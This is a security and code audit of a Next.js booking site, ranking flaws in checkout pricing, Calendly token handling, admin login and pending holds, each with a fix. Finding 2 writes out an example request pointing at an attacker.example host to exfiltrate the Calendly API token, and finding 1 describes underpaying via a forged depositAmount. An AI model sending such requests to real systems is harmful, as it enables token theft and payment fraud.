# RT Spaces — Code audit, 12 Sep 2026

Scope: `master` at `1bdadbe` (14 Jun 2026 launch merge). Read every API route, the booking
wizard, the admin auth path, pricing/discount logic, and the git history. Ran `tsc`, `eslint`,
`next build`, `npm outdated`, `npm audit`, and a secret scan over all text blobs in history.

**Headline:** the site works, builds clean, and types check. But the pay-and-book path has two
holes that let a visitor pay whatever they like and one that leaks the Calendly API token. None
of these need a redesign; together they are about a day of work. The "leaked keys in git
history" item from the July security note turned out to be false: every key ever committed
was a placeholder.

---

## P0 — fix before the next real booking

### 1. Checkout trusts the browser's price
`app/api/checkout/route.ts:50-63` uses `totalPrice` / `depositAmount` straight from the request
body when they are present, and only recalculates when they are missing. The wizard always
sends them (`components/booking/BookingWizard.tsx:438-439`), so the server never computes
the price in practice.

- Anyone can POST `depositAmount: 1` for a Full Day and pay £1.
- The discount validator is fed the same client number (`basePrice`), so a percentage code
  discounts a made-up price.
- The route reads the static `BOOKING_PACKAGES`, not `getMergedPackages()`, so admin price
  overrides and disabled packages are ignored at the moment of payment.
- The admin bookings table (`app/api/admin/bookings/route.ts:27-30`) shows `totalPrice` from
  session metadata, i.e. the same client number, so a manipulated booking looks legitimate.

**Fix:** recompute on the server from `selectedPackage` + `startTime`/`endTime` + a validated
add-ons list, using `getMergedPackages()`; reject disabled packages; ignore any price fields
in the body. Then pass the server price into `validateDiscountCode`. Metadata becomes
trustworthy for free.

### 2. Calendly API token can be stolen
`app/api/calendly-event-details/route.ts:28-33,54-59` fetches whatever `eventUri` and
`inviteeUri` the browser sends, with `Authorization: Bearer ${CALENDLY_API_TOKEN}` attached.
POST `{ eventUri: "https://attacker.example/", inviteeUri: "..." }` and the token arrives in the
attacker's logs. That token can list every invitee and cancel every booking.

**Fix:** allow only `https://api.calendly.com/scheduled_events/<uuid>` and
`.../scheduled_events/<uuid>/invitees/<uuid>` (regex on the full URL), 400 otherwise. Rotate
the token after deploying.

### 3. Unauthenticated "confirm" on pending holds
`app/api/pending-bookings/route.ts:88-100` — `PATCH { id, action: "confirm" }` marks a hold as
confirmed with no payment and no auth. Confirmed holds are removed from the expiry set, so the
Calendly slot is never released. Nothing in the client calls PATCH or GET on this route.

**Fix:** delete the `PATCH` and `GET` handlers. The webhook is the only legitimate confirmer.

## P1 — fix this sprint

### 4. Expired holds are never released in production
`lib/pendingBookings.ts:139` cancels expired holds only when something calls
`/api/cancel-expired-bookings` (or the pending-bookings GET). There is no `vercel.json`, so no
cron. Every abandoned checkout leaves a 15-minute Calendly hold booked forever, and the studio
sees phantom bookings in Calendly. Could not verify Vercel dashboard crons from this machine
(CLI not installed), but the repo has none.

**Fix:** add `vercel.json` with a `*/5 * * * *` cron on `/api/cancel-expired-bookings`, and
gate the route on `Authorization: Bearer ${CRON_SECRET}` (Vercel sends it automatically).

### 5. Admin login has no brute-force protection
`app/admin/login/action.ts:19` compares the password with `!==` and there is no rate limit or
lockout. `lib/admin/auth.ts:30,44` uses `ADMIN_PASSWORD` itself as the HMAC signing secret.
The admin can change live prices and create 100% discount codes, so this is worth hardening.

**Fix:** Upstash rate limit on the login action (5 attempts / 15 min per IP), constant-time
compare, and a separate `ADMIN_SESSION_SECRET` so a password change invalidates sessions on
purpose rather than by accident.

### 6. Pending-hold creation is open
`app/api/pending-bookings/route.ts:5-52` accepts any `calendlyEventUri`. The expiry job later
calls Calendly's cancel endpoint with the UUID from that URI. Attackers cannot guess real
UUIDs, but it lets anyone fill Redis with holds and hammer the Calendly API on the studio's
token.

**Fix:** validate the URI shape (same regex as #2) and rate-limit the route per IP.

## P2 — cleanups worth doing while in there

7. **Dead dependencies** (verified by import grep across `app/`, `components/`, `lib/`):
   `googleapis` (only imported by `lib/calendar.ts`, which nothing imports),
   `@stripe/react-stripe-js`, `@stripe/stripe-js`, `@tabler/icons-react`, `clsx`,
   `tailwind-merge`. `googleapis` alone is ~100 MB of `node_modules` and slows every install
   and cold start. Remove all six plus `lib/calendar.ts`.
8. **Dead Calendly code:** `lib/calendlyApi.ts:47-99` `createCalendlyEventInvitee` POSTs to
   `/scheduled_events`, which does not exist in Calendly's API. Only `cancelCalendlyEvent` is
   used. Delete the rest.
9. **Discount usage counter races:** `lib/admin/kv.ts:49-53` does read-modify-write. Two
   near-simultaneous checkouts can under-count a `maxUses` code. Store `usedCount` in its own
   key and `INCR` it.
10. **Discount codes can be enumerated:** `/api/validate-discount` has no rate limit. Add the
    same Upstash limiter as #5.
11. **Membership checkout** (`app/api/checkout/membership/route.ts:44,56`): pins
    `payment_method_types: ["card"]`, which suppresses Apple/Google Pay that the main
    checkout deliberately enables; and the line-item copy says "Cancel anytime", contradicting
    the 3-month minimum locked on 13 Jun. No webhook handling for `customer.subscription.*`,
    so memberships live only in Stripe. Fine for now, but say so in the admin.
12. **Stale success copy:** `components/BookingSuccessMessage.tsx:22` promises "a link to
    confirm your exact time slot" — the slot was already chosen in Calendly. Also the 3 lint
    errors live in this file (unescaped `'`).
13. **Wrong fallback domains:** `lib/email.ts:25-26,138-139` default to `@rtspaces.com`;
    the real domain is `rtspaces.co.uk`. Harmless while env vars are set; a trap if not.
14. **Render-blocking Calendly CSS** in `app/layout.tsx:92` loads on every page; only
    `/book-online` and the wizard need it. (Already on the Sprint C list.)
15. **Stock-photo hosts** still whitelisted in `next.config.ts` (Unsplash, Pexels). Remove
    once no `<Image>` points at them.
16. **Upgrade path:** `next` 16.0.10 → 16.3.5, `stripe` 20.0.0 → 22.6.2, `resend` 6.5 → 6.28.
    Next minors carry security patches; do it after the P0s land.
